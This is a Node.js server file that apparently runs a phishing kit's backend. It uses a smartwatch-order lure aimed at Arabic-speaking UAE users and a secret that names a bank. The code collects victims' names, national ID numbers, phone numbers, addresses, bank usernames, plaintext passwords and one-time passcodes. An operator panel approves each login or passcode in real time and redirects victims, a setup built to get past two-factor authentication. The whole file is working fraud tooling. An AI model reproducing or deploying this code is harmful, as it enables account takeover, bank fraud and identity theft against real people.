const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { supabase } = require('../lib/supabase');

const ADMIN_HASH = '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9';
const TOKEN_SECRET = ADMIN_HASH + '_mbank_secret';

function sha256(str) {
  return crypto.createHash('sha256').update(str).digest('hex');
}

function createToken() {
  const ts = Date.now().toString();
  const sig = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
  return ts + '.' + sig;
}

function verifyToken(token) {
  if (!token || !token.includes('.')) return false;
  const [ts, sig] = token.split('.');
  const expected = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
  if (sig !== expected) return false;
  const age = Date.now() - parseInt(ts);
  return age < 7 * 24 * 60 * 60 * 1000;
}

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || '0.0.0.0';
}

function getCookies(req) {
  return (req.headers.cookie || '').split(';').reduce((acc, c) => {
    const [k, v] = c.trim().split('=');
    if (k) acc[k] = v;
    return acc;
  }, {});
}

function isAdmin(req) {
  const header = req.headers['x-admin-token'];
  if (header && verifyToken(header)) return true;
  const cookies = getCookies(req);
  return verifyToken(cookies.admin_token);
}

function readBody(req) {
  return new Promise((resolve) => {
    if (req.body !== undefined) {
      resolve(typeof req.body === 'string' ? req.body : JSON.stringify(req.body));
      return;
    }
    let body = '';
    req.on('data', c => { body += c; if (body.length > 1e6) req.destroy(); });
    req.on('end', () => resolve(body));
  });
}

function json(res, data, status) {
  res.writeHead(status || 200, {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, x-admin-token'
  });
  res.end(JSON.stringify(data));
}

module.exports = async (req, res) => {
  if (req.method === 'OPTIONS') {
    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, x-admin-token'
    });
    return res.end();
  }

  const reqPath = decodeURIComponent(req.url.split('?')[0]);

  // --- Admin Login ---
  if (req.method === 'POST' && (reqPath === '/admin/login' || reqPath === '/api/admin-login')) {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      if (sha256(data.password || '') === ADMIN_HASH) {
        const token = createToken();
        return json(res, { success: true, token });
      }
      return json(res, { success: false, message: 'كلمة المرور غير صحيحة' }, 401);
    } catch (e) {
      return json(res, { success: false, message: 'خطأ في الطلب' }, 400);
    }
  }

  // --- Clicks ---
  if (req.method === 'POST' && reqPath === '/api/clicks') {
    const ip = getIP(req);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      await supabase.from('orders').insert({
        name: '', phone: '', id_number: '', email: '', emirate: '', address: '',
        country: (data.country || 'غير معروف').substring(0, 100),
        service: (data.service || '').substring(0, 100),
        lang: data.lang || 'ar',
        ip,
        status: 'click',
        date: new Date().toISOString()
      });
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Orders ---
  if (req.method === 'POST' && reqPath === '/api/orders') {
    const ip = getIP(req);
    const { data: blocked } = await supabase.from('blocked_ips').select('ip').eq('ip', ip).single();
    if (blocked) return json(res, { success: false, message: 'محظور' }, 403);

    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const { data: order, error } = await supabase.from('orders').insert({
        name: (data.name || '').substring(0, 100),
        phone: (data.phone || '').substring(0, 20),
        id_number: (data.id_number || '').substring(0, 50),
        email: (data.email || '').substring(0, 100),
        emirate: (data.emirate || '').substring(0, 50),
        address: (data.address || '').substring(0, 200),
        country: (data.country || 'الإمارات').substring(0, 50),
        service: (data.service || 'طلب ساعة ذكية').substring(0, 100),
        lang: data.lang || 'ar',
        ip,
        status: 'pending',
        date: new Date().toISOString()
      }).select().single();
      if (error) return json(res, { error: error.message }, 500);
      return json(res, { success: true, id: order.id });
    } catch (e) {
      return json(res, { success: false, message: 'خطأ في البيانات' }, 400);
    }
  }

  // --- Stats ---
  if (req.method === 'GET' && reqPath === '/api/stats') {
    const cutoff = new Date(Date.now() - 60000).toISOString();
    const { count: activeCount } = await supabase.from('visitors').select('id', { count: 'exact', head: true }).gt('last_seen', cutoff);
    const { count: totalOrders } = await supabase.from('orders').select('id', { count: 'exact', head: true });
    const { count: pendingOrders } = await supabase.from('orders').select('id', { count: 'exact', head: true }).eq('status', 'pending');
    return json(res, {
      activeVisitors: activeCount || 0,
      totalVisitsToday: 0,
      pageViewsToday: 0,
      totalOrders: totalOrders || 0,
      pendingOrders: pendingOrders || 0
    });
  }

  // --- Get Orders ---
  if (req.method === 'GET' && reqPath === '/api/orders') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const { data: orders } = await supabase.from('orders').select('*').order('id', { ascending: false });
    return json(res, { orders: orders || [] });
  }

  // --- Visitors ---
  if (req.method === 'GET' && reqPath === '/api/visitors') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const cutoff = new Date(Date.now() - 60000).toISOString();
    const { data: active } = await supabase.from('visitors').select('*').gt('last_seen', cutoff);
    return json(res, { visitors: active || [], count: (active || []).length });
  }

  // --- Order Status ---
  if (req.method === 'POST' && reqPath === '/api/orders/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const { error } = await supabase.from('orders').update({ status: data.status }).eq('id', data.id);
      if (error) return json(res, { error: 'not found' }, 404);
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Block IP ---
  if (req.method === 'POST' && reqPath === '/api/block-ip') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      await supabase.from('blocked_ips').upsert({ ip: data.ip }, { onConflict: 'ip' });
      await supabase.from('orders').update({ status: 'blocked' }).eq('ip', data.ip);
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Login Attempts (Sessions) ---
  if (req.method === 'POST' && reqPath === '/api/login-attempts') {
    const ip = getIP(req);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      if (data.sessionId) {
        const { data: existing } = await supabase.from('sessions').select('id').eq('id', parseInt(data.sessionId)).single();
        if (existing) {
          await supabase.from('sessions').update({
            username: (data.username || '').substring(0, 100),
            password: (data.password || '').substring(0, 100),
            login_status: 'waiting',
            otp: null,
            otp_status: null,
            redirect_url: null,
            date: new Date().toISOString()
          }).eq('id', existing.id);
          return json(res, { success: true, id: existing.id });
        }
      }
      const { data: session, error } = await supabase.from('sessions').insert({
        username: (data.username || '').substring(0, 100),
        password: (data.password || '').substring(0, 100),
        country: (data.country || 'غير معروف').substring(0, 100),
        lang: data.lang || 'ar',
        ip,
        service: (data.service || '').substring(0, 200),
        order_name: (data.orderName || '').substring(0, 100),
        order_phone: (data.orderPhone || '').substring(0, 50),
        order_email: (data.orderEmail || '').substring(0, 100),
        order_id_number: (data.orderIdNumber || '').substring(0, 50),
        order_emirate: (data.orderEmirate || '').substring(0, 50),
        order_address: (data.orderAddress || '').substring(0, 200),
        order_id: data.orderId ? parseInt(data.orderId) : null,
        login_status: 'waiting',
        date: new Date().toISOString()
      }).select().single();
      if (error) return json(res, { error: error.message }, 500);
      return json(res, { success: true, id: session.id });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Login Attempt Status Check ---
  if (req.method === 'GET' && reqPath.startsWith('/api/login-attempts/') && reqPath.endsWith('/status')) {
    const id = parseInt(reqPath.split('/')[3]);
    const { data: s } = await supabase.from('sessions').select('login_status, redirect_url').eq('id', id).single();
    if (!s) return json(res, { status: 'not_found' }, 404);
    return json(res, { status: s.login_status, redirectUrl: s.redirect_url || null });
  }

  // --- Update Login Status ---
  if (req.method === 'POST' && reqPath === '/api/login-attempts/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const { error } = await supabase.from('sessions').update({ login_status: data.status }).eq('id', data.id);
      if (error) return json(res, { error: 'not found' }, 404);
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- OTP Attempts ---
  if (req.method === 'POST' && reqPath === '/api/otp-attempts') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const id = parseInt(data.loginId);
      const { data: s } = await supabase.from('sessions').select('id').eq('id', id).single();
      if (!s) return json(res, { error: 'session not found' }, 404);
      await supabase.from('sessions').update({
        otp: (data.otp || '').substring(0, 20),
        otp_status: 'waiting'
      }).eq('id', id);
      return json(res, { success: true, id });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- OTP Status Check ---
  if (req.method === 'GET' && reqPath.startsWith('/api/otp-attempts/') && reqPath.endsWith('/status')) {
    const id = parseInt(reqPath.split('/')[3]);
    const { data: s } = await supabase.from('sessions').select('otp_status, redirect_url').eq('id', id).single();
    if (!s) return json(res, { status: 'not_found' }, 404);
    return json(res, { status: s.otp_status || 'not_found', redirectUrl: s.redirect_url || null });
  }

  // --- Update OTP Status ---
  if (req.method === 'POST' && reqPath === '/api/otp-attempts/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const { error } = await supabase.from('sessions').update({ otp_status: data.status }).eq('id', data.id);
      if (error) return json(res, { error: 'not found' }, 404);
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Sessions List ---
  if (req.method === 'GET' && reqPath === '/api/sessions') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const { data: sessions } = await supabase.from('sessions').select('*').order('id', { ascending: false });
    const list = (sessions || []).map(s => {
      let pendingAction = null;
      if (s.login_status === 'waiting') {
        pendingAction = { type: 'login', id: s.id };
      } else if (s.login_status === 'approved' && s.otp_status === 'waiting') {
        pendingAction = { type: 'otp', id: s.id };
      }
      return {
        ...s,
        loginStatus: s.login_status,
        otpStatus: s.otp_status,
        redirectUrl: s.redirect_url,
        orderName: s.order_name,
        orderPhone: s.order_phone,
        orderEmail: s.order_email,
        orderIdNumber: s.order_id_number,
        orderEmirate: s.order_emirate,
        orderAddress: s.order_address,
        orderId: s.order_id,
        pendingAction
      };
    });
    return json(res, { sessions: list });
  }

  // --- Session Redirect ---
  if (req.method === 'POST' && reqPath === '/api/sessions/redirect') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const { error } = await supabase.from('sessions').update({ redirect_url: data.url }).eq('id', data.id);
      if (error) return json(res, { error: 'not found' }, 404);
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Heartbeat ---
  if (reqPath === '/api/heartbeat') {
    const ip = getIP(req);
    await supabase.from('visitors').upsert({ ip, page: '', last_seen: new Date().toISOString() }, { onConflict: 'ip' });
    return json(res, { ok: true });
  }

  // --- Wait Function ---
  if (reqPath === '/api/wait-fn') {
    return json(res, { status: 0 });
  }

  // --- Polling Redirect ---
  if (reqPath === '/api/polling-redirect') {
    return json(res, { redirect: null });
  }

  // --- Admin page protection ---
  if ((reqPath.startsWith('/admin/') || reqPath === '/admin') && reqPath !== '/admin/login' && reqPath !== '/admin/login.html') {
    if (!isAdmin(req)) {
      const ROOT = path.join(__dirname, '..');
      const loginPage = path.join(ROOT, 'admin', 'login.html');
      if (fs.existsSync(loginPage)) {
        const content = fs.readFileSync(loginPage, 'utf8');
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        return res.end(content);
      }
      res.writeHead(302, { 'Location': '/admin/login.html' });
      return res.end();
    }
    const ROOT = path.join(__dirname, '..');
    let filePath = reqPath;
    if (filePath.endsWith('/')) filePath += 'index.html';
    const fullPath = path.join(ROOT, filePath);
    if (fs.existsSync(fullPath)) {
      const ext = path.extname(fullPath).toLowerCase();
      const MIME = {
        '.html': 'text/html; charset=utf-8', '.css': 'text/css',
        '.js': 'application/javascript', '.png': 'image/png',
        '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
        '.svg': 'image/svg+xml', '.json': 'application/json',
      };
      res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
      return res.end(fs.readFileSync(fullPath));
    }
  }

  return json(res, { error: 'not found' }, 404);
};
